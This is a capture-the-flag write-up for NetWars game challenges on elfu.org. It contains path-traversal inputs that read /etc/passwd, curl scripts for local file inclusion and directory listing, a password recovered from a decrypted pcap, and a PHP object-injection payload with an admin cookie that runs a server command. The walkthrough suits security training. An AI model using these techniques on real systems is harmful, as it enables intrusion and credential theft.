# Snaaake

## What two, large words appear first when you exit the game? e.g. Elf Terminal

Quit the game through the UI and then:

```
______             _____                       _
|  _  \           /  __ \                     | |
| | | |_____   __ | /  \/ ___  _ __  ___  ___ | | ___
| | | / _ \ \ / / | |    / _ \| '_ \/ __|/ _ \| |/ _ \
| |/ /  __/\ V /  | \__/\ (_) | | | \__ \ (_) | |  __/
|___/ \___| \_/    \____/\___/|_| |_|___/\___/|_|\___|

NOTE: Disable in production, port 3000

Tools:

* netcat
* openvpn
* nmap

Your IP is 192.168.64.2
```

## What high-numbered port is open on another host in the same /24 network? e.g. 5000

3000

```
elf@52aadb50d975:~$ nmap -p 3000 192.168.64.0/24
Starting Nmap 7.70 ( https://nmap.org ) at 2020-05-14 18:44 UTC
Nmap scan report for 192.168.64.1
Host is up (0.00037s latency).

PORT     STATE SERVICE
3000/tcp open  ppp

Nmap scan report for 52aadb50d975 (192.168.64.2)
Host is up (0.00024s latency).

PORT     STATE  SERVICE
3000/tcp closed ppp

Nmap scan report for 960a1eb2-66db-49ea-9940-d1e5ed6dcdec-1.d4fd3562-d3fe-43ac-9d10-a91e46c3d8c2 (192.168.64.3)
Host is up (0.00021s latency).

PORT     STATE SERVICE
3000/tcp open  ppp

Nmap done: 256 IP addresses (3 hosts up) scanned in 2.85 seconds
```

## What flag is shown when you disable something outside the Snaaake game?

NetWars{ShutItDown}

```
elf@52aadb50d975:~$ netcat 192.168.64.3 3000
>INFO:OpenVPN Management Interface Version 1 -- type 'help' for more info
help
Management Interface for OpenVPN 2.4.8 x86_64-alpine-linux-musl [SSL (OpenSSL)] [LZO] [LZ4] [EPOLL] [MH/PKTINFO] [AEAD] built on Feb  7 2020
Commands:
auth-retry t           : Auth failure retry mode (none,interact,nointeract).
bytecount n            : Show bytes in/out, update every n secs (0=off).
echo [on|off] [N|all]  : Like log, but only show messages in echo buffer.
exit|quit              : Close management session.
forget-passwords       : Forget passwords entered so far.
help                   : Print this message.
hold [on|off|release]  : Set/show hold flag to on/off state, or
                         release current hold and start tunnel.
kill cn                : Kill the client instance(s) having common name cn.
kill IP:port           : Kill the client instance connecting from IP:port.
load-stats             : Show global server load stats.
log [on|off] [N|all]   : Turn on/off realtime log display
                         + show last N lines or 'all' for entire history.
mute [n]               : Set log mute level to n, or show level if n is absent.
needok type action     : Enter confirmation for NEED-OK request of 'type',
                         where action = 'ok' or 'cancel'.
needstr type action    : Enter confirmation for NEED-STR request of 'type',
                         where action is reply string.
net                    : (Windows only) Show network info and routing table.
password type p        : Enter password p for a queried OpenVPN password.
remote type [host port] : Override remote directive, type=ACCEPT|MOD|SKIP.
proxy type [host port flags] : Enter dynamic proxy server info.
pid                    : Show process ID of the current OpenVPN process.
client-auth CID KID    : Authenticate client-id/key-id CID/KID (MULTILINE)
client-auth-nt CID KID : Authenticate client-id/key-id CID/KID
client-deny CID KID R [CR] : Deny auth client-id/key-id CID/KID with log reason
                             text R and optional client reason text CR
client-kill CID [M]    : Kill client instance CID with message M (def=RESTART)
env-filter [level]     : Set env-var filter level
client-pf CID          : Define packet filter for client CID (MULTILINE)
rsa-sig                : Enter an RSA signature in response to >RSA_SIGN challenge
                         Enter signature base64 on subsequent lines followed by END
certificate            : Enter a client certificate in response to >NEED-CERT challenge
                         Enter certificate base64 on subsequent lines followed by END
signal s               : Send signal s to daemon,
                         s = SIGHUP|SIGTERM|SIGUSR1|SIGUSR2.
state [on|off] [N|all] : Like log, but show state history.
status [n]             : Show current daemon status info using format #n.
test n                 : Produce n lines of output for testing/debugging.
username type u        : Enter username u for a queried OpenVPN username.
verb [n]               : Set log verbosity level to n, or show if n is absent.
version                : Show current version number.
END
signal SIGTERM
SUCCESS: signal SIGTERM thrown
elf@52aadb50d975:~$

     __     _   __    __                 ____ _           _    _____ _      ___                  __
  /\ \ \___| |_/ / /\ \ \__ _ _ __ ___  / / _\ |__  _   _| |_  \_   \ |_   /   \_____      ___ __\ \
 /  \/ / _ \ __\ \/  \/ / _` | '__/ __|| |\ \| '_ \| | | | __|  / /\/ __| / /\ / _ \ \ /\ / / '_ \| |
/ /\  /  __/ |_ \  /\  / (_| | |  \__ < < _\ \ | | | |_| | |_/\/ /_ | |_ / /_// (_) \ V  V /| | | |> >
\_\ \/ \___|\__| \/  \/ \__,_|_|  |___/| |\__/_| |_|\__,_|\__\____/  \__/___,' \___/ \_/\_/ |_| |_| |
                                        \_\                                                      /_/

NetWars{ShutItDown}
```

# SAME

## If you type in a bad difficulty level, what is the error type that occurs? (e.g. SparkleTooHighError)

FileNotFoundError

```
What difficulty level would you like? Options: easy, medium, hard -> super hard
Oops, something went wrong reading the configuration file: FileNotFoundError
[Errno 2] No such file or directory: '/home/same/super hard'

Press ctrl-c to exit
```

## If you load an invalid file using a path traversal, what type of file is it expecting? (e.g. YAML)

JSON

```
╭─zoey@nomadic ~/netwars
╰─$ nc same.elfu.org 8080
What difficulty level would you like? Options: easy, medium, hard -> ../../etc/passwd
Failed to parse JSON configuration file: <class 'json.decoder.JSONDecodeError'>
Expecting value: line 1 column 1 (char 0)

-- START DEBUG INFORMATION --
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
same:x:1000:1000:,,,:/home/same:/bin/bash
Debian-exim:x:101:101::/var/spool/exim4:/usr/sbin/nologin

-- END DEBUG INFORMATION --

Press ctrl-c to exit
```

## Can you find the full path to the Python script? (e.g. /path/to/file.py)

`/home/same/same.py`

## What is the flag at the top of the Python script? (e.g. NetWars{IHeartChristmas} )

`NetWars{you_found_me}`

```
╭─zoey@nomadic ~/netwars
╰─$ nc same.elfu.org 8080
What difficulty level would you like? Options: easy, medium, hard -> ../../proc/self/cmdline
Failed to parse JSON configuration file: <class 'json.decoder.JSONDecodeError'>
Expecting value: line 1 column 1 (char 0)

-- START DEBUG INFORMATION --
python3/home/same/same.py
-- END DEBUG INFORMATION --

Press ctrl-c to exit
╭─zoey@nomadic ~/netwars
╰─$ nc same.elfu.org 8080
What difficulty level would you like? Options: easy, medium, hard -> ../../home/same/same.py
Failed to parse JSON configuration file: <class 'json.decoder.JSONDecodeError'>
Expecting value: line 1 column 1 (char 0)

-- START DEBUG INFORMATION --
#!/usr/bin/env python3

# Flag: NetWars{you_found_me}

import json
import random
import os
```

# Snowball Fight

## Win a game of Snowball Fight and submit the flag. (e.g. NetWars{BooYa} )

`NetWars{YouSankMyBattlefort}`

## Win a game of Snowball Fight on Impossible and submit the flag.

You can use chrome to override `battlefort.js` and look at the websocket network history in dev tools. Change the following source code and it should print out the
forts on the board:

```
ws.onmessage = function (event) {
  console.log("Incoming ws: " + event.data);
  var messageIn = JSON.parse(event.data);

  if (messageIn.Type == "SALUTE") {
    document.getElementById("statusVerify").value = messageIn.Verify;
    for (y = 0; y < messageIn.Status["FriendlyLayout"].length; y++) {
      for (x = 0; x < messageIn.Status["FriendlyLayout"][y].length; x++) {
        if (messageIn.Status["FriendlyLayout"][y][x] == 1) {
          document.getElementById("1," + x + "," + y).classList.add("fort");
        }
      }
    }
    document.getElementById("statusVerify").value = messageIn.Verify;
    for (y = 0; y < messageIn.Status["EnemyLayout"].length; y++) {
      for (x = 0; x < messageIn.Status["EnemyLayout"][y].length; x++) {
        if (messageIn.Status["EnemyLayout"][y][x] == 1) {
          document.getElementById("0," + x + "," + y).classList.add("fort");
        }
      }
    }
  }
```

Click the forts and you end up with a message:

```
You win!
You won on impossible! NetWars{YouMustBePeeking}
```

## Defeat the Enemy with one shot and submit the flag.

Enemy is very literal here and refers to the actual text on the board which is right above 0,0. So lets enter 0, -1 in and we get the following message
in the console:

```
NetWars{ThatsOneWayToWin}
```

# Play pawng

## Complete the Pawng Scapy Trainer. What's your certificate ID number?

47150284637509565 - Just go through the training to get it. Look at the scapy docs.

## Find the (Get Help) Instruction ID from sending a Scapy packet

The packet is described in `broken_controller.py`, run `tail -F /var/log/pawng.log`, and use the python to send the packet

2196517487091929

```
elfadmin@7fbaa7f9eae5:~$ python3
Python 3.6.9 (default, Apr 18 2020, 01:56:04)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> from scapy.all import *
>>> sr1(IP(dst="127.0.0.1")/UDP(dport=20,sport=5000))
Begin emission:
Finished sending 1 packets.
.*
Received 2 packets, got 1 answers, remaining 0 packets
<IP  version=4 ihl=5 tos=0x0 len=1536 id=1 flags= frag=0 ttl=64 proto=udp chksum=0x76ea src=127.0.0.1 dst=127.0.0.1 |<UDP  sport=20 dport=5000 len=1516 chksum=0x5581 |<Raw  load='\xe2\x94\x8d\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x
80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x9
4\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2
\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x91\
n\xe2\x94\x82 ARCADE PAWNG HELP:                                           \xe2\x94\x82\n\xe2\x94\x95\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2
\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\
xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x
80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x99\n1. Get This Help Menu:\n    Send a UDP packet to any 127.0.0.1 w/ a dst UDP port of 20\n
   and src UDP port of 5000.\n2. Move Paddle Up:\n    Send a TCP packet w/ IP dst="127.0.20.180", TCP dport=20, \n    TCP flags="PA", and a TCP raw paylod of load="up".\n3. Move Paddle Down:\n    Send an ICMP echo reply w/ IP dst="127.80
.1.46", and a \n    ICMP raw paylod of load="down".\n4. Change Computer Opponent\'s Difficulty:\n    Send a DNS query response to UDP port 53 with a source \n    port of 6000 to any 127.0.0.1 with a DNS qr=1, DNSQR \n    qname="difficult
y.local", and the DNSRR \n    rrname="difficulty.local" and the DNSRR rdata="100".\nNote: The 100 in rdata="100", specifies difficulty from 0-100.\nNote: Packet protocol details NOT specified above dont matter.\nNote: Results of actions
1-4 are logged to /var/log/pawng.log.\nNote: The first to score 10 points wins. \n\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x8
0\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94
\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\
x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\n' |>>>
>>>
KeyboardInterrupt
>>>
KeyboardInterrupt
>>>
elfadmin@7fbaa7f9eae5:~$ cat /var/log/pawng.log
(Get Help) Instruction ID 2196517487091929 Executed
(Get Help) Instruction ID 2196517487091929 Executed
```

Help menu cleaned up

```
1. Get This Help Menu:
    Send a UDP packet to any 127.0.0.1 w/ a dst UDP port of 20
   and src UDP port of 5000.
2. Move Paddle Up:
    Send a TCP packet w/ IP dst="127.0.20.180", TCP dport=20,
    TCP flags="PA", and a TCP raw paylod of load="up".
3. Move Paddle Down:
    Send an ICMP echo reply w/ IP dst="127.80.1.46", and a
    ICMP raw paylod of load="down".
4. Change Computer Opponent\'s Difficulty:
    Send a DNS query response to UDP port 53 with a source
    port of 6000 to any 127.0.0.1 with a DNS qr=1, DNSQR
    qname="difficulty.local", and the DNSRR
    rrname="difficulty.local" and the DNSRR rdata="100".
Note: The 100 in rdata="100", specifies difficulty from 0-100.
Note: Packet protocol details NOT specified above dont matter.
Note: Results of actions 1-4 are logged to /var/log/pawng.log.
Note: The first to score 10 points wins.
```

## Find the (Move Up) Paddle Instruction ID

9802227387255195

```

lfadmin@7fbaa7f9eae5:~\$ python3
Python 3.6.9 (default, Apr 18 2020, 01:56:04)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

> > > from scapy.all import\*
> > > sr1(IP(dst="127.0.20.180")/TCP(dport=20,flags="PA")/Raw(load="up"))
> > > Begin emission:
> > > Finished sending 1 packets.
> > > .^C
> > > Received 1 packets, got 0 answers, remaining 1 packets
> > >
> > > elfadmin@7fbaa7f9eae5:~\$ cat /var/log/pawng.log
> > > (Get Help) Instruction ID 2196517487091929 Executed
> > > (Get Help) Instruction ID 2196517487091929 Executed
> > > (Move Up) Paddle Instruction ID 9802227387255195 Executed
> > > (Move Up) Paddle Instruction ID 9802227387255195 Executed

```

## Find the Move Down Instruction

2116779544198846

```

elfadmin@7fbaa7f9eae5:~$ tail -F /var/log/pawng.log &
[1] 206
elfadmin@7fbaa7f9eae5:~$ (Get Help) Instruction ID 2196517487091929 Executed
(Get Help) Instruction ID 2196517487091929 Executed
(Move Up) Paddle Instruction ID 9802227387255195 Executed
(Move Up) Paddle Instruction ID 9802227387255195 Executed
elfadmin@7fbaa7f9eae5:~\$ python3
Python 3.6.9 (default, Apr 18 2020, 01:56:04)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

> > > from scapy.all import \*
> > > send(IP(dst="127.80.1.46")/ICMP(type="echo-reply")/Raw(load="down"))
> > > .
> > > Sent 1 packets.
> > > (Move Down) Paddle Instruction ID 2116779544198846 Executed

```

## Find the CHange Difficult Instruction ID

8892931792975189

```

elfadmin@7fbaa7f9eae5:~\$ python3
Python 3.6.9 (default, Apr 18 2020, 01:56:04)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

> > > from scapy.all import \*
> > > sr1(IP(dst="127.0.0.1")/UDP(sport=6000, dport=53)/DNS(qr=1,qd=DNSQR(qname="difficulty.local"), an=DNSRR(rrname="difficulty.local", rdata="0")))
> > > Begin emission:
> > > Finished sending 1 packets.
> > > .(Change Difficulty) Instruction ID 8892931792975189 Executed

```

## Win Pawng!

Use the packets above in the source code after copying it into a new file. If you set the difficulty to 0 you'll just win really quick. The win screen says

`Prolific Ping Pawng Pwner`

```python
def set_difficulty(GAME_DIFFICULTY="100"):
    send(IP(dst="127.0.0.1")/UDP(sport=6000, dport=53)/DNS(qr=1,qd=DNSQR(qname="difficulty.local"), an=DNSRR(rrname="difficulty.local", rdata="0")), iface="lo", verbose=False)

def paddle_up():
    send(IP(dst="127.0.20.180")/TCP(dport=20,flags="PA")/Raw(load="up"), iface="lo", verbose=False)

def paddle_down():
    send(IP(dst="127.80.1.46")/ICMP(type="echo-reply")/Raw(load="down"), iface="lo", verbose=False)
```

# Elf Invaders

https://www.bram.us/2020/04/08/how-to-enable-http3-in-chrome-firefox-safari/ Enable HTTP3 in firefox

## Find the version number of the Cabinet once you see the game. (e.g. 8.675309)

In the source of the main HTML file is

```html
<meta name="description" content="Elf Invaders Version 1.61434327095534551" />
```

## What is the message when you score over 9500? (e.g. That's over 9500!)

In the hitbox detection function, set `player.score = 10000` and then let it resume execution. You eventually make a request to the API that results in a response
with `Score Level Over 9000!`

## What's the date in api.php?

`5/1/2019`

It looks like there's an api request with a file. Use the curl version on the elf debug terminal since it has http3 support. Create a script, `lfi.sh`.

```
#!/bin/sh
curl --silent --http3 'https://elf-invaders.elfu.org/api.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://elf-invaders.elfu.org' -H 'Alt-Used: elf-invaders.elfu.org' -H 'Connection: keep-alive' -H 'Referer: https://elf-invaders.elfu.org/leaderboard.php' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'TE: Trailers' --data-raw "conf=${1}" | sed -n 's/.*"data":"//p' | sed -n 's/"}//p'
echo ''
```

We can then use the script to grab stuff

```
../config/config.json returns a file
../../www/config/config.json
./lfi.sh "../../../var/www/config/config.json" works but /var/www/config/config.json doesn't work
../lfi.sh ../html/api.php
```

in api.php

```
<?php
  // Made By Alabaster Snowball on 5/1/2019
  function get_db() {
    $dbname = '/var/www/db/elfinvaders.sqlite';
    if (file_exists($dbname) && filesize($dbname) > 500000) {
      unlink($dbname);
    }
```

## Find the name of the debug PCAP on the web server.

Looking in api.php, we can do directory listings too with `list=` as the payload. Create `dir.sh`:

```
#!/bin/sh
curl --silent --http3 'https://elf-invaders.elfu.org/api.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://elf-invaders.elfu.org' -H 'Alt-Used: elf-invaders.elfu.org' -H 'Connection: keep-alive' -H 'Referer: https://elf-invaders.elfu.org/leaderboard.php' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'TE: Trailers' --data-raw "list=${1}"
echo ''
```

We can use this to list files and find there's a file `adminlogin_debug.pcap`.

## Find Alabaster's password. (e.g. DirectReindeerFlatteryStable)

Grabbing the `adminlogin_debug.client_random` and using it in wireshark to decrypt the QUIC in the pcap we find some payloads:

```
@Ç(ÍðôÒ¹~îåÚ6¡GREASE is the word,ÔQ`rRj®zÿ×P¢\.®Ã_P%¶PÃ«¸úàZþ?ÝTqÿï@Eusername=alabaster_snowball&password=4084072e86e12aabef9ace3e39145ba3
```

Entering `4084072e86e12aabef9ace3e39145ba3` as the flag works.

## Update the cabinet's firmware and retrieve the new version number.

People left files sitting around so I found this without doing what's intended, just the LFI and directory listing, but I did most of the object injection anyways.

2.11516925085506347

get_auth_cookie.sh

```
#!/bin/sh
curl -v --http3 'https://elf-invaders.elfu.org/admin.php' -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://elf-invaders.elfu.org' -H 'Alt-Used: elf-invaders.elfu.org' -H 'Connection: keep-alive' -H 'Referer: https://elf-invaders.elfu.org/leaderboard.php' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'TE: Trailers' --data-raw "username=alabaster_snowball&password=4084072e86e12aabef9ace3e39145ba3" 2>&1 | grep "set-cookie" | sed -E "s/.*elfinv=([a-zA-Z0-9._-]+);.*/\1/"
```

php for generating the object injection

```
<?php
  class OldAdminMethod
  {
    // Will remove this later after testing more secure new admin class
    public $command;
    public $logname;

    function __construct($cmd="", $log='/var/www/db/cmdhist.log')
    {
      $this->command = $cmd;
      $this->logname = $log;
    }

    public function readlog() {
      if (file_exists($this->logname) && is_readable($this->logname)) {
        return preg_replace( '/[^[:print:]\r\n\t]/', '', file_get_contents($this->logname));
      }
    }

    function __destruct()
    {
      $stdout = shell_exec($this->command);
      if (strlen($stdout)) {
        if (is_writable(dirname($this->logname))) {
          file_put_contents($this->logname, "{$this->command}\n$stdout");
        }
      }
    }
  }

$file = '/var/www/db/cmdhist.log';
$oldAdminMethod = new OldAdminMethod('/usr/bin/firmwareupdate', $file);
echo "'" . serialize($oldAdminMethod) . "'";
echo "\n";
```

generates

```
'O:14:"OldAdminMethod":2:{s:7:"command";s:23:"/usr/bin/firmwareupdate";s:7:"logname";s:23:"/var/www/db/cmdhist.log";}'
```

Then we can use the cookie and the above to generate a request to admin.php to do command injection via the object injection. The lifecycle methods are called
when the class is created and then destroyed over the course of the request.

```

curl -v --http3 'https://elf-invaders.elfu.org/admin.php' -H "Cookie:
elfinv=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxhYmFzdGVyX3Nub3diYWxsIiwiZXhwaXJlcyI6MTU4OTY3Mjc3NiwiZXhwIjozMTc5MjU5MTUyfQ.fwQJ4c-jpMHxG7_H_4uT82368Xb9DnE1LhhE0HcX03k" -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' -H 'X-Requested-With: XMLHttpRequest' -H 'Origin: https://elf-invaders.elfu.org' -H 'Alt-Used: elf-invaders.elfu.org' -H 'Connection: keep-alive' -H 'Referer: https://elf-invaders.elfu.org/leaderboard.php' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-origin' -H 'TE: Trailers' --data-raw 'method=read_file&arguments=O:14:"OldAdminMethod":2:{s:7:"command";s:23:"/usr/bin/firmwareupdate";s:7:"logname";s:23:"/var/www/db/cmdhist.log";}'

```

Then we should be able to use LFI to get the log.

```
elfuser@bdd5e02ba86f:~\$ ./lfi.sh ../db/cmdhist.log | xxd -r -p
/usr/bin/firmwareupdate
Firmware Updated - Elf Invader Version 2.11516925085506347
```
